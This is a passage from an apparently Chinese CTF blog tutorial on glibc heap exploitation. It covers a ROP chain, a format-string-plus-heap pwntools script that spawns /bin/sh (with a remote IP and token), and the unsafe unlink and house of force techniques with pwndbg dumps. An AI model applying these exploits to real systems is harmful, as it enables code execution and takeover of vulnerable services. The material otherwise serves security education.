r12 -&gt; rip got@read</span></div><div class="line">ropchain += p64(<span class="number">8</span>)                          <span class="comment"># r13 -&gt; rdx</span></div><div class="line">ropchain += p64(addr + <span class="number">0x0000000000202078</span>)  <span class="comment"># r14 -&gt; rsi got@atoi</span></div><div class="line">ropchain += p64(<span class="number">0</span>)                          <span class="comment"># r15 -&gt; rdi</span></div><div class="line">ropchain += p64(addr + <span class="number">0x00000000000011C0</span>)  <span class="comment"># magic</span></div><div class="line">ropchain += <span class="string">'a'</span>*<span class="number">8</span>*<span class="number">7</span></div><div class="line"></div><div class="line">ropchain += p64(addr + <span class="number">0x0000000000000B65</span>)  <span class="comment"># getInt</span></div><div class="line"></div><div class="line">target.sendline(<span class="string">'yes     '</span> + ropchain)</div><div class="line">addr = target.recvline()[:<span class="number">-1</span>]</div><div class="line">addr = u64(addr + <span class="string">'\x00'</span> * (<span class="number">8</span> - <span class="built_in">len</span>(addr)))</div><div class="line"><span class="comment">#addr = addr - 534112 + 288144</span></div><div class="line">addr = addr - <span class="number">537984</span> + <span class="number">283536</span></div><div class="line">print hex(addr)</div><div class="line">target.sendline(p64(addr)+<span class="string">'/bin/sh'</span>)</div><div class="line">target.interactive()</div></pre></td></tr></table></figure>
<p>另外一种方法，更简单，<a href="https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/" target="_blank" rel="external">参考链接</a></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">global <span class="built_in">io</span></div><div class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line">elf = ELF(<span class="string">'./pwn-f'</span>)</div><div class="line"></div><div class="line">def create_list(<span class="built_in">io</span>,length,strr):</div><div class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'quit'</span>)</div><div class="line">	<span class="built_in">io</span>.sendline(<span class="string">'create '</span>)</div><div class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'Pls give string size:'</span>)</div><div class="line">	<span class="built_in">io</span>.sendline(length)</div><div class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'str:'</span>)</div><div class="line">	<span class="built_in">io</span>.sendline(strr)</div><div class="line"></div><div class="line">def delete_list(<span class="built_in">io</span>,number):</div><div class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'quit'</span>)</div><div class="line">	<span class="built_in">io</span>.sendline(<span class="string">'delete '</span>)</div><div class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'id:'</span>)</div><div class="line">	<span class="built_in">io</span>.sendline(number)</div><div class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">	<span class="built_in">io</span>.sendline(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line"></div><div class="line">def pwn():</div><div class="line">	global <span class="built_in">io</span></div><div class="line"></div><div class="line">	<span class="built_in">debug</span> = <span class="number">1</span></div><div class="line">	<span class="keyword">if</span> <span class="built_in">debug</span>:</div><div class="line">   	 	<span class="built_in">io</span> = process(<span class="string">'./pwn-f'</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		#<span class="built_in">io</span> = remote(<span class="string">'127.0.0.1'</span>,<span class="number">2333</span>)</div><div class="line">		<span class="built_in">io</span> = remote(<span class="string">'115.28.78.54'</span>,<span class="number">80</span>)</div><div class="line">		<span class="built_in">io</span>.recvuntil(<span class="string">'please input you token: '</span>)</div><div class="line">		<span class="built_in">io</span>.sendline(<span class="string">'b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh'</span>)</div><div class="line">#<span class="comment">------------------------------------------------use fsb to leak __libc_start_main's address</span></div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'aaaa'</span>)</div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'bbbb'</span>)</div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'cccc'</span>)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'0'</span>)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'1'</span>)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'2'</span>)</div><div class="line">	content1 = <span class="string">"%175$p"</span>.ljust(<span class="number">24</span>,<span class="string">'a'</span>)+<span class="string">'\xd0\xf9\x00'</span></div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'29'</span>,content1)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'1'</span>)                     #<span class="comment">-----printf('%113$p')</span></div><div class="line"></div><div class="line">	data = <span class="built_in">io</span>.recv(<span class="number">14</span>)</div><div class="line">	libc_start_main = int(data,<span class="number">16</span>)<span class="number">-240</span></div><div class="line">	<span class="built_in">print</span> <span class="string">"libc_start_main_addr="</span>+hex(libc_start_main)</div><div class="line">#<span class="comment">--------------------------------------------------caculate system_addr	</span></div><div class="line">	libc_start_main_offset = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">	system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">	system_addr = libc_start_main  - libc_start_main_offset + system_addr</div><div class="line">	<span class="built_in">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</div><div class="line"></div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'zzzz\x00'</span>)</div><div class="line"></div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'aaaa\x00'</span>)</div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'bbbb\x00'</span>)</div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'10'</span>,<span class="string">'cccc\x00'</span>)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'2'</span>)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'3'</span>)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'4'</span>)</div><div class="line">#<span class="comment">----------can't have '\x00' in string.because len(string) must &gt;15.And after '/bin/sh' must have a space.</span></div><div class="line">	content2 = <span class="string">"/bin/sh #"</span>.ljust(<span class="number">24</span>,<span class="string">'a'</span>)+ p64(system_addr)  </div><div class="line">	create_list(<span class="built_in">io</span>,<span class="string">'32'</span>,content2)</div><div class="line">	delete_list(<span class="built_in">io</span>,<span class="string">'3'</span>)                     #system(<span class="string">'/bin/sh'</span>)</div><div class="line">	</div><div class="line">	<span class="built_in">io</span>.sendline(<span class="string">'uname -a'</span>)</div><div class="line">	<span class="built_in">io</span>.interactive()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">while</span> True:</div><div class="line">		try:</div><div class="line">			pwn()</div><div class="line">		except EOFError:</div><div class="line">			<span class="built_in">print</span> <span class="string">'guess not success!!!'</span></div><div class="line">			<span class="built_in">io</span>.close()</div><div class="line">			time.sleep(<span class="number">0.5</span>)</div></pre></td></tr></table></figure>
<h2 id="0x04-unsafe-unlink"><a href="#0x04-unsafe-unlink" class="headerlink" title="0x04 unsafe unlink"></a>0x04 unsafe unlink</h2><p>这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当<strong>前一个堆块</strong>空闲时，<strong>向后合并</strong>；当<strong>后一个堆块</strong>空闲时，<strong>向前合并</strong>。</p>
<p>glibc的unlink宏（简化版）：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">FD = P-&gt;fd<span class="comment">;</span></div><div class="line"><span class="keyword">BK </span>= P-&gt;<span class="keyword">bk;</span></div><div class="line">if(FD-&gt;<span class="keyword">bk </span>== P &amp;&amp; <span class="keyword">BK-&gt;fd </span>== P)</div><div class="line">&#123;</div><div class="line">	FD-&gt;<span class="keyword">bk </span>= P<span class="comment">;</span></div><div class="line">	<span class="keyword">BK-&gt;fd </span>= P<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当我们存在向后合并的情况时：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">| chunk1(p1) | chunk2(p2) |</div><div class="line">*/</div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"></div><div class="line">void *ptr<span class="comment">;</span></div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	int prev_size, size, fd, <span class="keyword">bk;</span></div><div class="line">	void *p1, *p2<span class="comment">;</span></div><div class="line">	char <span class="keyword">buf[253] </span>= <span class="string">""</span><span class="comment">;</span></div><div class="line"></div><div class="line">	p1 = malloc(<span class="number">252</span>)<span class="comment">;</span></div><div class="line">	p2 = malloc(<span class="number">252</span>)<span class="comment">;</span></div><div class="line"></div><div class="line">	ptr = p1<span class="comment">;</span></div><div class="line">	prev_size = <span class="number">0</span><span class="comment">;</span></div><div class="line">	size = <span class="number">249</span><span class="comment">;</span></div><div class="line">	fd = (int)(&amp;ptr) - <span class="number">0xc</span><span class="comment">;</span></div><div class="line">	<span class="keyword">bk </span>= (int)(&amp;ptr) - <span class="number">0x8</span><span class="comment">;</span></div><div class="line"></div><div class="line">	memset(<span class="keyword">buf, </span><span class="string">'c'</span>, <span class="number">253</span>)<span class="comment">;</span></div><div class="line">	memcpy(<span class="keyword">buf, </span>&amp;prev_size, <span class="number">4</span>)<span class="comment">;</span></div><div class="line">	memcpy(<span class="keyword">buf+4, </span>&amp;size, <span class="number">4</span>)<span class="comment">;</span></div><div class="line">	memcpy(<span class="keyword">buf+8, </span>&amp;fd, <span class="number">4</span>)<span class="comment">;</span></div><div class="line">	memcpy(<span class="keyword">buf+12, </span>&amp;<span class="keyword">bk, </span><span class="number">4</span>)<span class="comment">;</span></div><div class="line">	size = <span class="number">248</span><span class="comment">;</span></div><div class="line">	memcpy(&amp;<span class="keyword">buf[248], </span>&amp;size, <span class="number">4</span>)<span class="comment">;</span></div><div class="line">	<span class="keyword">buf[252] </span>= <span class="string">'\x00'</span><span class="comment">;</span></div><div class="line"></div><div class="line">	memcpy(p1, <span class="keyword">buf, </span><span class="number">253</span>)<span class="comment">;</span></div><div class="line">	free(p2)<span class="comment">;</span></div><div class="line">	return <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*P为fake_chunk，由chunk2-&gt;pre_size得到</span></div><div class="line">P == ptr;</div><div class="line">*/</div><div class="line"><span class="attr">FD</span> = P-&gt;fd;                     // <span class="attr">FD</span> = P-&gt;<span class="attr">fd</span> = &amp;ptr - <span class="number">0</span><span class="attr">xc</span> = *(ptr + <span class="number">0</span>x8)</div><div class="line"><span class="attr">BK</span> = P-&gt;bk;                    // <span class="attr">BK</span> = P-&gt;<span class="attr">bk</span> = &amp;ptr - <span class="number">0</span><span class="attr">x8</span> = *(ptr + <span class="number">0</span>xc)</div><div class="line"><span class="keyword">if</span>(FD-&gt;<span class="attr">bk</span> == P &amp;&amp; BK-&gt;<span class="attr">fd</span> == P)</div><div class="line"><span class="comment">/*</span></div><div class="line">	此时</div><div class="line">    FD-&gt;bk = ptr = *(&amp;ptr - 0xc + 0xc)</div><div class="line">    BK-&gt;fd = ptr = *(&amp;ptr - 0x8 + 0x8)</div><div class="line">    绕过检查</div><div class="line">*/</div><div class="line">&#123;</div><div class="line">	FD-&gt;<span class="attr">bk</span> = BK;                // FD-&gt;<span class="attr">bk</span> = &amp;ptr - <span class="number">0</span>x8; <span class="attr">ptr</span> == &amp;ptr - <span class="number">0</span>x8;</div><div class="line">	BK-&gt;<span class="attr">fd</span> = FD;                 // BK-&gt;<span class="attr">fd</span> = &amp;ptr - <span class="number">0</span>xc; <span class="attr">ptr</span> == &amp;ptr - <span class="number">0</span>xc;</div><div class="line">&#125;</div><div class="line"><span class="comment">/*</span></div><div class="line">最后ptr = &amp;ptr - 0xc</div><div class="line">*/</div></pre></td></tr></table></figure></p>
<h2 id="0x05-house-of-spirit"><a href="#0x05-house-of-spirit" class="headerlink" title="0x05 house of spirit"></a>0x05 house of spirit</h2><h2 id="0x09-house-of-force"><a href="#0x09-house-of-force" class="headerlink" title="0x09 house of force"></a>0x09 house of force</h2><p>我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。</p>
<p>这里我们来看<code>how2heap</code>中给出的demo</p>
<p>首先我们定义一个全局变量<code>bss_var</code>，值为<code>This is a string that we want to overwrite.</code></p>
<p>我们查看下他的地址为<code>0x602060</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; p &amp;bss_var </div><div class="line">$<span class="number">3</span> = (char (*)[<span class="number">44</span>]) <span class="number">0x602060</span> &lt;bss_var&gt;</div></pre></td></tr></table></figure></p>
<p>然后我们分配一个大小256堆块，地址为<code>0x7fffffffdec8</code><br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; p &amp;p1</div><div class="line"><span class="meta"><span class="meta-keyword">$4</span> = (intptr_t **) 0x7fffffffdec8</span></div></pre></td></tr></table></figure></p>
<p>由于已使用中的chunk要加上8byte的<code>prev_size</code>和8byte的<code>size</code></p>
<p>所以真实的chunk的起始地址为<code>0x603410</code><br>此时我们查看堆的地址如下<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; heap </div><div class="line">Top Chunk: <span class="number">0</span>x603520</div><div class="line">Last Remainder: <span class="number">0</span></div><div class="line"></div><div class="line"><span class="number">0</span>x603000 PREV_INUSE &#123;</div><div class="line">  <span class="attr">prev_size</span> = <span class="number">0</span>, </div><div class="line">  <span class="attr">size</span> = <span class="number">1041</span>, </div><div class="line">  <span class="attr">fd</span> = <span class="number">0</span>x20706f7420656854, </div><div class="line">  <span class="attr">bk</span> = <span class="number">0</span>x7473206b6e756863, </div><div class="line">  <span class="attr">fd_nextsize</span> = <span class="number">0</span>x2074612073747261, </div><div class="line">  <span class="attr">bk_nextsize</span> = <span class="number">0</span>x3832353330367830</div><div class="line">&#125;</div><div class="line"><span class="number">0</span>x603410 PREV_INUSE &#123;</div><div class="line">  <span class="attr">prev_size</span> = <span class="number">0</span>, </div><div class="line">  <span class="attr">size</span> = <span class="number">273</span>, </div><div class="line">  <span class="attr">fd</span> = <span class="number">0</span>x0, </div><div class="line">  <span class="attr">bk</span> = <span class="number">0</span>x0, </div><div class="line">  <span class="attr">fd_nextsize</span> = <span class="number">0</span>x0, </div><div class="line">  <span class="attr">bk_nextsize</span> = <span class="number">0</span>x0</div><div class="line">&#125;</div><div class="line"><span class="number">0</span>x603520 PREV_INUSE &#123;</div><div class="line">  <span class="attr">prev_size</span> = <span class="number">0</span>, </div><div class="line">  <span class="attr">size</span> = <span class="number">133857</span>, </div><div class="line">  <span class="attr">fd</span> = <span class="number">0</span>x0, </div><div class="line">  <span class="attr">bk</span> = <span class="number">0</span>x0, </div><div class="line">  <span class="attr">fd_nextsize</span> = <span class="number">0</span>x0, </div><div class="line">  <span class="attr">bk_nextsize</span> = <span class="number">0</span>x0</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此时原先的top chunk的大小为<code>133857-1</code>(1为flag位)</p>
<p>我们修改top chunk的size为<code>-1</code>(<code>0xffffffffffffffff</code>)<br>此时，top chunk的大小为<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x603520</span> &#123;</div><div class="line">  prev_size = <span class="number">0</span>, </div><div class="line">  size = <span class="number">0</span>, </div><div class="line">  fd = <span class="number">0xffffffffffffffff</span>, </div><div class="line">  bk = <span class="number">0x0</span>, </div><div class="line">  fd_nextsize = <span class="number">0x0</span>, </div><div class="line">  bk_nextsize = <span class="number">0x0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了</p>
<p>我们分配的大小为<code>unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;</code><br>也就是<code>0xffffffffffffeb28</code>，得到这样一个大数以实现堆的反向分配</p>
<p>此时我们再分配就得到了<code>bbs_var</code>了，我们可以对<code>bbs_var</code>做读写操作了</p>
<h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>2017zctf的dragon和2016bctf的bclould</p>
<p>先看2016bctf这题<br>在输入姓名时存在有漏洞的截断，当我们输入<code>i</code>个字符时，是在第<code>i+1</code>的位置添加<code>\x00</code>然而，但是我们后面看到的地址的赋值操作时，会把<code>\x00</code>给覆盖掉，当我们<code>strcpy</code>时，就会把堆指针给copy进去。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buffer; <span class="comment">// [sp+1Ch] [bp-5Ch]@1</span></div><div class="line">  <span class="keyword">char</span> *_name; <span class="comment">// [sp+5Ch] [bp-1Ch]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+6Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="number">80u</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</div><div class="line">  read_buf((<span class="keyword">int</span>)&amp;buffer, <span class="number">64</span>, <span class="number">10</span>);</div><div class="line">  _name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">64u</span>);</div><div class="line">  name_addr = (<span class="keyword">int</span>)_name;                                     <span class="comment">//这里存在将'\x00'覆盖的情况</span></div><div class="line">  <span class="built_in">strcpy</span>(_name, &amp;buffer);</div><div class="line">  sub_8048779((<span class="keyword">int</span>)_name);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; telescope <span class="number">0x915d</span>008 <span class="number">20</span></div><div class="line"><span class="number">00</span>:<span class="number">0000</span>│ eax  <span class="number">0x915d</span>008 ◂— <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</div><div class="line">... ↓</div><div class="line"><span class="number">0f</span>:<span class="number">003</span>c│      <span class="number">0x915d</span>044 ◂— <span class="number">0x62616161</span> (<span class="string">'aaab'</span>)</div><div class="line"><span class="number">10</span>:<span class="number">0040</span>│      <span class="number">0x915d</span>048 —▸ <span class="number">0x915d</span>008 ◂— <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</div><div class="line"><span class="number">11</span>:<span class="number">0044</span>│ edx  <span class="number">0x915d</span>04c ◂— <span class="number">0x20f</span>00</div><div class="line"><span class="number">12</span>:<span class="number">0048</span>│      <span class="number">0x915d</span>050 ◂— <span class="number">0x0</span></div></pre></td></tr></table></figure>
<p>这里我们能看到输出的是<code>name_addr</code>这个指针的值。</p>
<p>接下来的<code>org</code>和<code>host</code>的copy其实也存在这个漏洞。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> org; <span class="comment">// [sp+1Ch] [bp-9Ch]@1</span></div><div class="line">  <span class="keyword">char</span> *_org; <span class="comment">// [sp+5Ch] [bp-5Ch]@1</span></div><div class="line">  <span class="keyword">int</span> host; <span class="comment">// [sp+60h] [bp-58h]@1</span></div><div class="line">  <span class="keyword">char</span> *_host; <span class="comment">// [sp+A4h] [bp-14h]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+ACh] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;org, <span class="number">0</span>, <span class="number">0x90</span>u);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Org:"</span>);</div><div class="line">  read_buf((<span class="keyword">int</span>)&amp;org, <span class="number">64</span>, <span class="number">10</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Host:"</span>);</div><div class="line">  read_buf((<span class="keyword">int</span>)&amp;host, <span class="number">64</span>, <span class="number">10</span>);</div><div class="line">  _host = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">64u</span>);</div><div class="line">  _org = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">64u</span>);</div><div class="line">  org_addr = (<span class="keyword">int</span>)_org;</div><div class="line">  host_addr = (<span class="keyword">int</span>)_host;</div><div class="line">  <span class="built_in">strcpy</span>(_host, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;host);</div><div class="line">  <span class="built_in">strcpy</span>(_org, &amp;org);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"OKay! Enjoy:)"</span>);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>好吧，其实这里还是细心才能看到的漏洞，我们发现<code>strcpy(_org, &amp;org);</code>这里其实是会把<code>org+_org+host</code>的数据全部copy到堆上，实事上我们可以调试发现，<code>host</code>的数据正好覆盖了top chunk的size，也就是<code>wildness</code>，这里我们修改为<code>0xffffffff</code></p>
<p>覆盖前：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>x<span class="number">945a098</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0a8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0b8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0c8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0d8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00020e71</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0e8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div></pre></td></tr></table></figure></p>
<p>覆盖后：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">40w</span>x <span class="number">0</span>x<span class="number">945a098</span></div><div class="line"><span class="number">0</span>x<span class="number">945a098</span>:	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0a8</span>:	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0b8</span>:	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0c8</span>:	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0d8</span>:	<span class="number">0</span>x<span class="number">0945a098</span>	<span class="number">0</span>xffffffff	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0</span>x<span class="number">945a0e8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div></pre></td></tr></table></figure></p>
<p>我们发现<code>0x945a0d8</code>这行的值被修改为我们想要的<code>0xffffffff</code>了。</p>
<p>这题能够通过<code>house of force</code>来解决。</p>
<p>我实现的步骤：</p>
<ol>
<li>leak name_addr 的堆地址，并通过计算得到top chunk的地址</li>
<li>修改wildness为<code>0xffffffff(-1)</code></li>
<li>分配一个大小为<code>wanted_addr - top_chunk_addr</code>堆块， 此时再分配得到的堆块即在<code>wanted_addr</code>地址上，我们就可以操纵这里的数据了</li>
<li>修改此处的堆块数据，覆盖<code>content_addr[]</code>为<code>free_got, read_got, atoi_got</code></li>
